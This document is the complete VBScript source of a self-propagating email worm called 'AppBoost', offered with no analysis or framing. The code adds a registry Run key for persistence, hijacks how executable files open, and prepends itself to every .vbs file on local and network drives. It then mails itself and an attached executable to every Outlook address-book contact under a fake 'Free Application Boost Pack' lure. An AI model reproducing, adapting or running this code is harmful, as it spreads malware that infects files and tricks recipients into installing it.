Rem -------xvstrt
Option Explicit
On Error Resume Next
Dim IsAppixInf,sAARGS,i,dnx,oSH,oFS,oENV,wDir,sDir,tDir,vFile,oMECpY,wDirs(6),vNames(3)
dnx=false
For i = 0 to WScript.Arguments.Count-1
 sAARGS = sAARGS+" "+WScript.Arguments(i)
 If WScript.Arguments(i) = "dnx" Then
  dnx=true
 End If
Next
If not dnx Then
  setvarz()
  regstuff()
  checkargs()
  infdirs()
  sendmails()
End If
Sub sendmails()
Dim oOL,oMAPI,cAL,oAL,oMSG,sAD,cENTRIES
Set oOL=WScript.CreateObject("Outlook.Application")
Set oMAPI=oOL.GetNameSpace("MAPI")
For cAL=1 to oMAPI.AddressLists.Count
 Set oAL=oMAPI.AddressLists(cAL)
 Set oMSG=oOL.CreateItem(0)
 If (oAL.AddressEntries.Count>0) then
  For cENTRIES=1 to oAL.AddressEntries.Count
     sAD=oAL.AddressEntries(cENTRIES)
     oMSG.Recipients.Add(sAD)
  Next
  oMSG.Subject = "Application Booster"
  oMSG.Body = "Try the Free Application Boost Pack, NOW !!!!"
  If oFS.FileExists(vFile) Then
   oMSG.Attachments.Add(vFile).DisplayName = "Installation Program"
  End If
  If oFS.FileExists(WScript.ScriptFullname) Then
   oMSG.Attachments.Add(WScript.ScriptFullname).DisplayName = "Installation Cleanup"
  End If
  If oFS.FileExists(wDirs(0)+"\\appboost.reg") Then
   oMSG.Attachments.Add(wDirs(0)+"\\appboost.reg").DisplayName = "Windows 9x/NT/2000 Patch Registry File"
  End If
  oMSG.Send
 End If
Next
End Sub
Sub checkargs()
 Dim i
 If WScript.Arguments.Count > 0 Then
  oSH.run ("wscript """+WScript.Arguments(0)+""" "+sAARGS+" dnx")
  InfectFile(WScript.Arguments(0))
 End If
End Sub
Sub infdirs()
 Dim oFold,oDR,sDR,oFC,cDIR,sTFILE,aFILES,sFILE
 If not oFS.FileExists(wDirs(0)+"\\appboost.vbs") Then
   Set oFC = oFS.GetFile(WScript.ScriptFullName)
   oFC.Copy(wDirs(0)+"\\appboost.vbs")
 End If
 Set oDR = oFS.Drives
 For Each sDR in oDR
  If sDR.DriveType = 2 or sDR.DriveType=3 Then
   cDIR = "dir "+sDR.path+"\\*.vbs /b /s"
   sTFILE = oFS.GetTempName
   sTFILE = wDirs(2) & "\\" & sTFILE
   oSH.Run "%comspec% /c " & cDIR & " >" & sTFILE, 0, true
   aFILES = Split(oFS.OpenTextFile(sTFILE).ReadAll,vbcrlf)
   oFS.DeleteFile sTFILE
   For Each sFILE in aFILES
    InfectFile(sFILE)
   Next   
  End If
 Next
End Sub
Sub regstuff()
 Dim v
 oSH.regwrite "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AppBoost","WScript.exe """+WScript.ScriptFullname+""""
 If IsAppixInf Then
  oSH.regwrite "HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command\\",wDirs(0)+"\\appboost.exe ""%1"" %*"
 End If
End Sub
Sub setVarz()
 Dim IsVir,oME,readLine,i
 Set oFS = CreateObject("Scripting.FileSystemObject")
 Set oSH = CreateObject("WScript.Shell") 
 Set oENV = oSH.Environment("Process")
 wDirs(0) = oFS.GetSpecialFolder(0)
 wDirs(1) = oFS.GetSpecialFolder(1)
 wDirs(2) = oFS.GetSpecialFolder(2)
 wDirs(3) = oSH.SpecialFolders("Desktop")
 wDirs(4) = oSH.SpecialFolders("MyDocuments")
 wDirs(5) = oSH.SpecialFolders("Startup")
 vNames(2) = "C:\\test.exe"
 vNames(0) = wDirs(0)+"\\appbsvc.exe"
 vNames(1) = wDirs(0)+"\\appboost.exe"
 For i = 0 to 2
  If oFS.FileExists(vNames(i)) Then
   vFile = vNames(i)
  End If
 Next
 If oFS.FileExists(vFile) Then
  IsAppixInf=true
 Else
  IsAppixInf=false
 End If
 Set oME = oFS.OpenTextFile(WScript.ScriptFullname,1)
 Do While Not oME.AtEndOfStream
  readLine = oME.ReadLine
  If readline = "Rem --------xvstrt" Then
    IsVir=true
  End If
  If IsVir Then
   oMECpY = oMECpY+readline+Chr(13)+Chr(10)
  End If 
  If readline = "Rem --------xved" Then
    IsVir=false
  End If
 Loop
End SuB
Function IsInfected(fToCheck)
 Dim IsVir,ofToCheck,readLine
 IsVir=false
 If oFS.FileExists(fToCheck) Then
 Set ofToCheck=oFS.OpenTextFile(fToCheck,1,true)
 Do While Not ofToCheck.AtEndOfStream
  readLine = ofToCheck.ReadLine
  If readline = "Rem --------xvstrt" Then
    IsVir=True
  End If
 Loop
 ofToCheck.close
 End If
 IsInfected = IsVir
End Function
Sub InfectFile(fToInf)
 Dim oOrig,ofToInf,oATT,aOLD
 If (not IsInfected(fToInf)) AND oFS.FileExists(fToInf) Then
  Set oFS = CreateObject("Scripting.FileSystemObject")
  Set ofToInf=oFS.OpenTextFile(fToInf,1,true)
  oOrig=ofToInf.ReadAll
  ofToInf.close
  Set oATT = oFS.GetFile(fToInf)  
  aOLD = oATT.Attributes
  oATT.Attributes = 0
  Set ofToInf=oFS.OpenTextFile(fToInf,2,true)
  ofToInf.write oMECpY+Chr(13)+Chr(10)+oOrig
  ofToInf.close
  Set oATT = oFS.GetFile(fToInf)  
  oATT.Attributes = aOLD
 End If
End Sub
Rem -------xved
